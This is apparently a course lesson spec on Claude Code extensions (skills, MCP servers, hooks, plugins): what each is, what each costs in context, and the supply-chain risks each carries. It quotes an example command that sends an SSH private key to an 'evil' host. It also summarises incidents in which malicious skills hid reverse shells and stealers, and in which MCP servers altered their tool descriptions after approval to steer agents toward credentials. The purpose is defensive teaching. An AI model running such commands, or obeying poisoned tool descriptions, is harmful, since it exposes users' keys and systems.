---
key: skills-mcp-hooks-and-plugins
id: 05.03
title: Skills, MCP, hooks and plugins
district: Directing Well
module: 05 What the agent sees
status: todo
legacy: []
minutes: 12
concepts: [C049, C050, C051, C091, C092]
sources: [S015, S130, S071, S162, S001, S002, S004, S008, S016, S021, S022, S042, S052, S059, S065, S069, S105, S106, S123, S125, S127, S128, S163, S164, S165]
lead: [S015, S162]
---
# Skills, MCP, hooks and plugins

**Purpose (the first spoken sentence):** In this lesson you'll learn what skills, MCP servers, hooks, subagents and plugins each are, what each one costs your agent every time it works, and why every one you install is code that runs with your permissions and can change after you said yes.

**Conclusion:** Each extension does one kind of job and takes up some of the agent's attention just by being installed, and skills, plugins and local MCP servers run as you, so install few, read what each is allowed to do before you enable it, and look again when it updates.

**Where it sits on the map:** District 3 · Directing Well — How do I direct and check it?; module 05 What the agent sees. Builds on 05.01 `what-the-agent-sees-each-turn` (the package every request carries) and 05.02 `rules-it-reads-rules-it-cant-break` (hooks as enforcement; rules only in sessions that load them).

**Lead source (audit, 2026-10-12):** S015 (Anthropic (Claude Code docs)); S162 (Or Nevo, Dor Granat, Niv Hoffman (Air Security)). This is the hard-won work the lesson delivers: credit it by name on the title card. The narration names at most the row's sources in curriculum.md (S015, S130, S071, S162); every other source in this spec goes on a dated on-screen card and on the lesson page's source list.

*Length:* 12 minutes, five concepts. Order: C049 (the shelf: what each thing is) → C051 (what each costs to keep loaded) with C050 folded in as one segment → C091 and C092 together as the safety half (C092's own entry says to teach it as a section of the C091 lesson). Roughly half the time on each half.

## What to teach (binding scope)

### C049 Skills, commands, plugins, connectors, MCP, hooks and subagents: what each one is
- **The shelf, one sentence each** (S015 unless marked):
  - **CLAUDE.md and `.claude/rules/`**: always-on text for what Claude should always know (S015, S123). One line here; 05.02 owns it.
  - **Skill**: "a markdown file containing knowledge, workflows, or instructions"; you invoke it with `/name` "or Claude can load them automatically when relevant". Only its name and description sit in context until it is used; then the body loads (S015, S130; S002 calls this progressive disclosure). Skills can be reference (a style guide) or action (`/deploy`) (S015). Where they live: personal `~/.claude/skills/`, project `.claude/skills/` ("Commit it so your team gets it too"), plugin, enterprise (S130).
  - **Command**: "Custom commands have been merged into skills." `.claude/commands/deploy.md` and `.claude/skills/deploy/SKILL.md` both create `/deploy` (S130).
  - **MCP server**: MCP is "an open source standard for AI-tool integrations. MCP servers give Claude Code access to your tools, databases, and APIs" (S015 companion: MCP docs). Each MCP tool is a primitive, like one API call; a skill ties tools into a multi-step procedure (S002). "MCP connects Claude to external services. Skills extend what Claude knows, including how to use those services effectively" (S015). MCP tools show up named `mcp__<server>__<tool>` (S127).
  - **Connector**: an MCP server you added in claude.ai; if you are logged into Claude Code with that account, connectors "are automatically available in Claude Code" (S015 companion: MCP docs).
  - **Hook**: a "script, HTTP request, MCP tool call, prompt, or subagent triggered by events"; it "always fires on its event" and costs "zero unless the hook returns output" (S015). Enforcement is 05.02's subject.
  - **Subagent**: an "isolated execution context that returns summarized results" (S015). Blind briefs are 05.01's subject.
  - **Plugin**: "the packaging layer. A plugin bundles skills, hooks, subagents, and MCP servers into a single installable unit"; plugin skills are namespaced (`/my-plugin:review`) and plugins are distributed through marketplaces (S015).
  — **teach**
- **Choose by trigger, not up front** (S015's table): a convention wrong twice → CLAUDE.md; the same prompt typed to start a task, or a playbook pasted a third time → a skill; copying data from a tab Claude can't see → an MCP server; a side task flooding the conversation → a subagent; something that must happen every time → a hook; a second repository needs the same setup → a plugin. — **teach** (the lesson's main card)
- The list keeps growing: the features overview re-read on 2026-10-12 also lists output styles, code intelligence, dynamic workflows, cross-session messaging and Artifacts (S015). Name that the list moves; don't teach each one. — **one line**

### C051 Every extension costs context
- **What rides on every request in Claude Code** (S015's context-cost table): CLAUDE.md in full; the active output style; skill descriptions (none for skills marked `disable-model-invocation: true`); MCP tool names and server instructions, with full schemas deferred until a tool is used because tool search is on by default. **What doesn't:** hooks (unless they return output) and subagents (their own window). — **teach**
- **Harnesses differ, so check yours.** In the Stanford intercept every enabled server's tool list went out with every request, and in late 2024 "servers such as GitHub's had something like 110 tools out of the box… The more you bloat the context, the worse the LLM can become at its task" (S002 line 194). Claude Code now defers MCP schemas (S015). CLI tools such as `gh` are "still more context-efficient than MCP servers because they don't add any per-tool listing" (S016). — **brief**
- **More is noise, not just space.** "Too much can fill up your context window, but it can also add noise that makes Claude less effective; skills may not trigger correctly, or Claude may lose track of your conventions" (S015). The trend is fewer, broader tools: Vercel "stripped 80% of the tools out of an agent and watched its success rate go from 80% to 100%", which S021 says to treat as direction, not magnitude: "Treat the direction as solid and the magnitude as unverified" (S021). — **brief**
- **Measure, don't guess:** `/context` for the live breakdown and `/context all` for tokens per MCP tool; `/mcp` to see and disconnect servers (S015); `/usage` attributes recent usage to skills, subagents, plugins and individual MCP servers (S016). Big tool output costs too: Claude Code warns above 10,000 tokens of MCP output and caps it at 25,000 by default (S015 companion: MCP docs). — **brief**
- **Choose your set at session start.** Tool definitions sit at the front of the cached prompt. With tool search on (the default), Claude Code keeps the first request's tool list for the whole conversation, so a server connecting mid-session doesn't disturb the cache; where tools load upfront, adding or removing a server invalidates it, and `/usage` names the likely cause, such as "tool definitions changed". A plugin's skills, commands, agents and hooks never invalidate it (S128). — **one line** (cost detail: 06.03)
- **Prune per project:** remove servers and skills you don't use; make side-effect skills user-only; for skills you didn't write, `skillOverrides` in settings hides them without editing their files (S015, S130). — **brief**

### C050 Skills load by their description (one segment inside C051)
- Claude "matches your task against skill descriptions to decide which are relevant. If descriptions are vague or overlap, Claude may load the wrong skill or miss one that would help. To tell Claude to use a specific skill, invoke it with `/<name>`" (S015). — **brief**
- Write *when* to use it, not everything it does. OpenAI's example (S022): bad, "Use when working with databases, queries, models, or persistence"; good, "Use when adding or changing a migration, or reviewing its rollout." Put the key use case first: the combined `description` and `when_to_use` text "is truncated at 1,536 characters in the skill listing" (S130); with many skills installed, Codex "starts shortening their descriptions to fit" (S022). — **brief**
- **The safety point to keep:** set `disable-model-invocation: true` on skills with side effects (`/deploy`, `/commit`, sending messages); then only you can trigger them, and their description stops costing context (S130, S015). — **teach** (short, but must land)
- Dropped here: writing and testing skill descriptions in depth (deep-dive backlog, "Writing skills that load at the right time"; vendor-only evidence).

### C091 Skills, plugins and local MCP servers are code that runs with your permissions
- **A skill is not just text.** "Skills can bundle and run scripts in any language" (S130). A project skill's `allowed-tools` lets Claude use those tools without asking during the turn that invokes it, and "Workspace trust doesn't gate this field… A skill can grant itself broad tool access, so review the `allowed-tools` of skills checked into a repository before you run Claude Code there" (S130). As late as 2026-09-28 (v2.1.284) Claude Code fixed plugins from marketplaces, claude.ai and npm pre-approving their own tools under a managed setting meant to stop that (S125). — **teach**
- **A plugin installs all of its parts at once** (S015); Anthropic's Cowork safety page: "installing one can significantly expand Claude's scope of action" (S069). — **brief**
- **A local MCP server is a program running as you.** The MCP specification's own example of a malicious startup command: `npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location`; "Attackers can execute any command with MCP client privileges" and "Users have no insight into what commands are being executed". A client offering one-click setup MUST show the exact command without truncation, flag it as dangerous, require explicit approval and allow cancel (S059, spec revision 2026-07-28). In Claude Code, MCP servers and hooks run outside the sandbox (S052's sandbox page). — **teach**
- **A listing is not an audit.** Anthropic "reviews connectors against its listing criteria before adding them to the Anthropic Directory, but does not security-audit or manage any MCP server", and reviewing `.mcp.json` "doesn't show every server a session can load", because user-scope servers, claude.ai connectors and plugins add more (S052's security page, re-read 2026-10-12). — **brief**
- **The case: ClawHavoc (S071, 2026-02-02; older than three months, still the primary record).** Koi Security audited 2,857 skills on ClawHub, OpenClaw's skill store, and found 341 malicious. 335 used a "Prerequisites" section telling users to install something first: on Windows a password-protected `openclaw-agent.zip`, on macOS a script from glot.io pasted into Terminal that fetched Atomic Stealer. The only bar to publishing was a GitHub account "at least one week old". Names looked right (typosquats such as `clawhub1`, `clawhubb`, `cllawhub`; lures such as `youtube-summarize` and `polymarket-trader`); some skills worked as advertised while hiding a reverse shell; one sent the bot's `~/.clawdbot/.env` to a webhook site. The store's fix came afterwards: a reporting button, with skills that collect more than three unique reports hidden automatically. The stealers went after API keys, exchange keys, wallet keys, SSH credentials and browser passwords (S071). — **teach** (the lesson's first case; the paste-a-command step itself belongs to 07.04)
- **A real beginner's question with no answer in its thread:** "It seems like it'd be impossible to vet a skill without reading it" (kian, S106). The lesson's answer: you read what declares its power, not every line of code; scripts go to a scanner; the safest move is not to run third-party code at all (next point). — **teach**
- **What you read before you enable anything:** who published it and where it came from ("Stick to verified extensions from the Claude Desktop directory, and carefully evaluate the permissions any extension or plugin requests before installing", S069); its `allowed-tools`, its hooks and the full MCP startup command (S130, S059); any "Prerequisites: paste this" step or password-protected zip is an automatic no (S071). In Cowork, switch to "Manually approve" when working with a new tool, plugin or site for the first time (S069). Enterprise plans can turn on skill scanning "to check skills and plugins for malicious content when they're installed" (S069): a floor, not a certificate. OpenAI's academy trainer advises rebuilding someone else's skill from examples rather than running it (S008, per concepts.md; re-check against the recording before quoting). — **teach**

### C092 An approved MCP server can change after you approve it (a section of C091)
- **Tool descriptions are instructions the agent reads.** A tool's description and signature become prompt text the model uses to decide what to do (S002 lines 93-95). — **brief**
- **The mechanism is built in.** "An MCP server can change the tools, prompts, or resources it offers while connected and send a `list_changed` notification"; in an interactive session Claude Code fetches the updated list "so you don't need to reconnect it" (S015 companion: MCP docs). Approval was for what the server said then. — **teach**
- **Deadbugz (S065, OWASP, 2026-10-08):** on 2026-08-10 the campaign submitted 23 pull requests to AI-project repositories within 74 minutes; its MCP server "behaved normally for its first three tool calls", then changed its own tool metadata to steer agents toward SSH keys, AWS credentials, shell history and Kubernetes config, hidden from operators. None of the pull requests were merged. OWASP's fix: "Snapshot MCP tool and prompt definitions at approval time and require re-approval when they change." — **teach**
- **Plugin4Shell (S162, Air Security, 2026-09-17):** Claude Code, Codex, GitHub Copilot and Gemini CLI checked out the commit a marketplace pinned for a plugin without verifying that the checkout produced that commit; a branch named like the pinned SHA won, because "git prefers a ref over a commit of the same name". Claude Code and Codex update installed plugins in the background by default, so the swap needed no click. Fixed in Claude Code 2.1.179 (2026-06-17) and Codex 0.146.0 (2026-08-12); Copilot had no patch at publication; Gemini CLI is deprecated and will not be patched. — **teach**
- **HookPry (S163, arXiv, 2026-09-03/08):** attacker-controlled hook updates "compromise all seven evaluated harnesses, with per-harness success rates reaching 92.5%"; "Microsoft Defender has 0% recall"; three static defences together miss 47.5% of the malicious artifacts. — **brief**
- **The moral, from Adversa's October list (S165, medium credibility, advice lines only):** "Pinning to a hash only protects you if something checks that the hash is what actually landed"; it advises disabling automatic plugin updates until the agent verifies the commit that landed. CSA's draft guide adds hashing tool descriptions and re-approving on change, and notes definition signing is not yet in the base MCP spec (S164, draft). — **brief**
- **Your moves:** keep the list of servers and plugins small and reviewed; install from sources you trust; re-read descriptions and hook changes when something updates; decide whether background plugin updates stay on; keep the agent itself patched (2.1.179 or later for Plugin4Shell) (S065, S162, S165). — **teach**

## You vs the agent
As of 2026-10-12:
- **The agent does on its own:** decides when to load a skill or call a tool; writes skills, hooks, subagent definitions, MCP config and plugins on request; reports its own context breakdown; can summarise in plain language everything a skill, plugin or server would do before you install it, and can look up where your version keeps the plugin-update setting (S015, S130).
- **What the agent cannot tell you:** that a server it never uses is costing you context; that a tool description changed since you approved it (it follows whatever the current description says, S065, S002); whether a skill is safe ("is this safe?" is not a check: a skill can work as advertised and carry a reverse shell, S071).
- **You decide and check:** which mechanism fits the need (the trigger table, S015); what is installed in each project, and pruning what isn't used; which skills have side effects and must be user-only (S130); the publisher, `allowed-tools`, hooks and full startup command of anything third-party, and a flat no to any "paste this first" step (S069, S130, S059, S071); re-reading on update and keeping the agent patched (S162).
- **Bring in someone who can:** any extension that will handle money, credentials, keys or production data needs an audit by someone who can read its code (S071, S069); a team that shares servers and plugins needs someone to run an allowlist, hash-and-compare checks and re-approval, which is engineering work (S164). How to hand it over: 04.04.

## Sources this lesson is built from
- S015 — Anthropic, "Extend Claude Code" (features overview; undated live docs; re-read 2026-10-12) https://code.claude.com/docs/en/features-overview — what each extension is; the trigger table; the context-cost table; "a request, not a guarantee"; noise. With its companion page "Connect Claude Code to tools via MCP" (https://code.claude.com/docs/en/mcp, undated, mentions up to v2.1.246; re-read 2026-10-12): what MCP is, connectors in Claude Code, `list_changed`, the 10,000/25,000-token output limits. Suggest giving the MCP page its own S-ID.
- S130 — Anthropic, "Skills" (Claude Code docs; undated, mentions v2.1.295; re-read 2026-10-12) https://code.claude.com/docs/en/skills — commands merged into skills; where skills live; the 1,536-character listing cap; `disable-model-invocation`; scripts; `allowed-tools` not gated by workspace trust.
- S071 — Ravie Lakshmanan (The Hacker News), reporting Koi Security and OpenSourceMalware, "Researchers Find 341 Malicious ClawHub Skills Stealing Data from OpenClaw Users" (2026-02-02; older than three months, kept as the primary incident record) https://thehackernews.com/2026/02/researchers-find-341-malicious-clawhub.html — the ClawHavoc campaign (re-read 2026-10-12).
- S162 — Or Nevo, Dor Granat, Niv Hoffman (Air Security), "Plugin4Shell - Zero Click RCE Vulnerability found in top 4 most popular coding agents" (2026-09-17) https://www.air.security/blog-posts/plugin4shell — unverified pinned commits; background updates; fixed versions (re-read 2026-10-12).

Also cited for specific points (credit on the lesson page):
- S002 — Mihail Eric, Stanford CS146S lecture transcript (2026-09-24) https://themodernsoftware.dev/materials/9-24-26-transcript.txt — tool definitions as prompt text; MCP tool versus skill; GitHub's 110 tools in late 2024.
- S016 — Anthropic, "Manage costs effectively" (Claude Code docs; undated, no earlier than 2026-09-14) https://code.claude.com/docs/en/costs — CLI tools cost less context than MCP; `/usage` attribution.
- S128 — Anthropic, "How Claude Code uses prompt caching" (undated; mentions up to v2.1.283; re-read 2026-10-12) https://code.claude.com/docs/en/prompt-caching — what an MCP or plugin change does to the cache.
- S021 — François Zaninotto (Marmelab), "The State Of AI Harness Engineering 2026" (2026-09-24) https://marmelab.com/blog/2026/09/24/the-state-of-ai-harness-engineering-2026.html — fewer tools; Vercel's figure as unverified.
- S022 — OpenAI, "Rethinking skills and prompts for GPT-6 Astra" (undated, no earlier than 2026-09-03) https://developers.openai.com/blog/rethinking-skills-and-prompts-for-gpt-6-astra — skill descriptions, bad and good.
- S127 — Anthropic, "Automate actions with hooks" (undated live docs) https://code.claude.com/docs/en/hooks-guide — `mcp__<server>__<tool>` naming.
- S125 — Anthropic, "Claude Code changelog" (entries read through v2.1.296, 2026-10-09) https://code.claude.com/docs/en/changelog — the v2.1.284 `allowed-tools` pre-approval fix; background marketplace auto-update.
- S059 — Model Context Protocol project, "Security Best Practices" (specification revision 2026-07-28) https://modelcontextprotocol.io/specification/2026-07-28/basic/security_best_practices — local MCP server compromise; what one-click clients must show (re-read 2026-10-12).
- S052 — Anthropic, Claude Code permission-mode, security and sandbox docs (undated, v2.1.283+; re-read 2026-10-12) https://code.claude.com/docs/en/security and https://code.claude.com/docs/en/sandboxing — no security audit of MCP servers; `.mcp.json` isn't the whole list; MCP servers and hooks run outside the sandbox.
- S069 — Anthropic (Claude Help Center), "Use Claude Cowork safely" (last modified 2026-10-06; page shows "Updated this week" on 2026-10-12) https://support.claude.com/en/articles/13364135-use-claude-cowork-safely — verified extensions; evaluate permissions; skill scanning; manually approve first-time tools.
- S106 — skeptic_ai and 18 commenters, "Ask HN: I still don't understand why AI agents need 'skills'" (2026-08-02) https://news.ycombinator.com/item?id=49139845 — "Skills are lazy loaded. AGENTS.md is not"; "impossible to vet a skill without reading it".
- S065 — OWASP Gen AI Security Project, "GenAI and Agentic AI Exploit Roundup Q3 2026" (2026-10-08) https://genai.owasp.org/2026/10/08/genai-and-agentic-ai-exploit-roundup-q3-2026 — Deadbugz; snapshot and re-approve.
- S163 — Pengxun Li et al., "A Blind Trust, the Bloody Thrust: When Attacker-Controlled Hook Updates Steer AI Agent Harnesses towards Malicious Behaviors" (arXiv v1 2026-09-03, v2 2026-09-08; abstract) https://arxiv.org/abs/2609.03884 — HookPry figures.
- S165 — Adversa AI team, "Top AI coding agent security resources - October 2026" (2026-10-02; medium credibility, advice lines only) https://adversa.ai/blog/top-ai-coding-agent-security-resources-october-2026/ — check that the pinned hash is what landed.
- S164 — Cloud Security Alliance labs, "Agentic MCP Security Best Practices Guide" (2026-03-27, draft) https://labs.cloudsecurityalliance.org/agentic/agentic-mcp-security-best-practices-v1/ — one line, marked draft (not re-opened 2026-10-12).
- S008 — OpenAI Academy, "Codex Bootcamp 101: Agentic coding" (2026-09-23) — rebuild rather than install; one line, only after re-checking the recording (the event page re-opened 2026-10-12 does not carry it).

**Corrections found while re-checking (2026-10-12):** C091 quotes S069 as "One install can widen what Claude can do considerably"; the page's words are "installing one can significantly expand Claude's scope of action". The prompt-caching page (S128) now says a plugin's skills, commands, agents and hooks never invalidate the cache, and that with tool search on a mid-session server change doesn't either; C051's cache point should be read with that qualification.

## Show it for real
- Tour a demo project's `.claude/` folder in a file explorer: `CLAUDE.md`, `rules/`, `skills/<name>/SKILL.md` with a script beside it, hooks in `settings.json`, and `.mcp.json`. Every name on the shelf is a real file you can open (S015, S130).
- `/context` showing the skill listing and MCP tool names, then `/context all` with tokens per MCP tool; `/mcp`, `/plugin` and `/hooks` in turn (S015, S127).
- Invoke a skill and show its body enter only at that moment: `/context` before and after, or the logging-proxy capture from 05.01 (S105, S002).
- Set `disable-model-invocation: true` on a side-effect skill and show its description vanish from the `/context` listing (S130, S015).
- Open a downloaded demo skill and read its `allowed-tools` line and the script files next to `SKILL.md`: the plain-language parts you can check without reading code (S130).
- Open an `.mcp.json` and read one server's command and arguments aloud, then show the approval prompt Claude Code shows for project-scoped servers (S059; S015 companion: MCP docs).
- A safe mock skill page (made for the lesson, nothing real to fetch) whose README says "Prerequisites: paste this into Terminal", with the publisher name set beside the official one: what ClawHavoc looked like (S071).
- `claude --version` next to Plugin4Shell's fixed version, 2.1.179 (S162).
- Credited screenshots: The Hacker News report (S071) and Air Security's write-up (S162).

## Questions this lesson answers
- "What is a Claude skill?", "Skill vs MCP vs plugin?" and "What's the difference between a skill, a command, a plugin and a connector?" (gap items citing S001-S004, S015)
- "When should I use MCP versus a skill?", "Where do skills live?", "What is a subagent for?" and "How do I share a skill with my team?" (S015)
- "Why do frameworks like Claude Code or Codex have the concept of 'skills' instead of just using well-organized Markdown docs?" (skeptic_ai, S106; answered in the thread with lazy loading)
- "Do MCP servers slow Claude down?", "Why is my agent slower after I added connectors?" and "How many skills is too many?" (gap items citing S001-S004, S015)
- "Why doesn't Claude use my skill?", "Why does my skill load when it shouldn't?" and "How does Claude choose a skill?" (S015, S022)
- "It seems like it'd be impossible to vet a skill without reading it" (kian, S106), "Is it safe to install skills from GitHub?", "Can a skill run code on my machine?" and "Why would a skill ask me to install something first?" (S106; batch readers from S015, S069, S071, S008)
- "What's an MCP rug pull?" and "Do I need to re-check an MCP server after updating?" (batch readers from S042, S065)
<!-- add yours: open an issue or a pull request -->

## Introduced here, taught elsewhere
- Hooks, deny rules and the sandbox as enforcement → `rules-it-reads-rules-it-cant-break` (05.02, C045)
- Subagents start blind and return a summary → `what-the-agent-sees-each-turn` (05.01, C028)
- Data a tool returns can carry instructions, even from an official server → `whose-words-is-it-reading` (07.01, C086)
- Never run a command a web page or README gives you; workspace trust; opening untrusted repos → `other-peoples-code` (07.04, C089, C090, C093)
- Packages an agent names may not exist; install time is execution time → `other-peoples-code` (07.04, C087, C088)
- What an extension connected to real accounts may do; four questions before connecting → `the-narrowest-keys-and-verbs` (07.03, C083, C085)
- What all of this costs in money → `know-your-meter` (06.03, C056, C057)
- Always-on personal agents (OpenClaw and others) as a store of credentials → `agents-that-run-while-youre-away` (08.01, C105)
- Building MCP servers for other people → deep-dive backlog (C067, C092)
- Writing skill descriptions in depth → deep-dive backlog (C050)
- Bringing in an expert → `before-you-ship-who-signs-off` (04.04, C118)

## Out-of-date framings to avoid
- "Slash commands and skills are different things" (S130).
- "Connectors are something other than MCP" (S015 companion: MCP docs) and "A plugin is a kind of tool" (S015).
- "Skills are the same as plugins or MCP servers" (S001-S004 item).
- "More MCP servers and skills make the agent more capable / smarter" (S002, S015) and "every MCP server eats your context" stated without saying which harness (S015, S128).
- "The agent automatically knows which skill to use" and "describe everything the skill can do" (S015, S022).
- "Skills are just text or markdown, so they're harmless" (S130, S071).
- "Anything listed in a marketplace or directory has been checked" (S071, S052).
- "MCP servers are like browser extensions with a limited permission list": they are commands with your privileges (S059).
- "If it has a good README and stars, it's legit" and "If the skill works, it isn't malware" (S071).
- "I approved this MCP server, so it's safe" (S065), "Pinning a version or hash means it's verified" (S162, S165) and "My antivirus would catch a bad update" (S163).
- From legacy 00.05: "Claude Marketplace, reported at over two thousand add-ons" and other counts not in `sources.md`; don't carry them over.

## Legacy notes
No legacy lesson covers this slot (`legacy: []`). Legacy 00.05 section 14 ("Skills, connectors, plugins") gives this ground about a minute: a skill as a folder whose "label sits on the desk; the pages load when the clerk needs them", a connector as a phone line built on MCP, a plugin as a boxed kit, and "every third-party add-on is code you're trusting", with the OpenClaw store as the example. Those pictures are right and can be reused. It has no hooks or subagents on the shelf, no trigger table, no context cost, nothing on `allowed-tools`, local MCP startup commands, servers changing after approval, or plugin updates, and its marketplace count is unsourced. When 00.05 is rebuilt, that section moves here.
